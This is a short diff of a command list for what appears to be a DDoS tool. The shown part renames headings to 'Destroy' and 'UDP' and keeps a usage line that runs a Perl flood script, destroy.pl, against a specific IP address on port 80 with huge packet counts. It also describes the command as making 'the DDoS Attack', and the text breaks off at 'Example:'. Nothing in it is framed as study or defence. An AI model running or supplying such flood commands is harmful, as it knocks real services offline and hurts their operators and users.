@@ -1,10 +1,10 @@
 # Commands
 
-$ bots
+$ Destroy 
 
 perl destroy.pl 76.223.105.230 80 65500 50000000000
 
-$ attack
+$ UDP
 
 This command make the DDoS Attack, Example:
 
